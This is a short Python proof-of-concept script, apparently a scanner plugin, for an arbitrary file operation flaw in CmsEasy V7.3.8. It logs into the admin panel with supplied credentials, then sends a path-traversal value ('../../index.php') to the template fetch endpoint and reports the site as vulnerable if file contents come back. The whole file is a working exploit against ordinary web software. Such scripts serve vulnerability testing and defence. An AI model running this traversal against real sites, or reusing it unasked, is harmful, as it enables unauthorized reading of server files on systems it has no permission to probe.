# coding: utf-8
import requests
import datetime

#CmsEasy V7.3.8 任意文件操作
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/index.php?case=template&act=fetch&admin_dir=admin&site=default'

    username = logindict.keys()
    password = logindict.values()
    #登录
    logurl = url + '/index.php?case=admin&act=login&admin_dir=admin&site=default'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    data = {
        "submit": '%E6%8F%90%E4%BA%A4',
        "username": username,
        "password": password
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies)
    else:
        response = sesion.post(logurl, headers=header, data=data)
    # print(response.text)
    if response.status_code==200 and "后台管理" in response.text:
        data={
            'id':'../../index.php'
        }
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = sesion.post(exp_url, headers=header,data=data, proxies=proxies)
        else:
            response = sesion.post(exp_url, headers=header,data=data)

        if '{"content":"=' in response.text and response.status_code==200:
            return 'CmsEasy 7.3.8 - 任意文件操作'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url, logindict, user_agent, proxies)
        return result

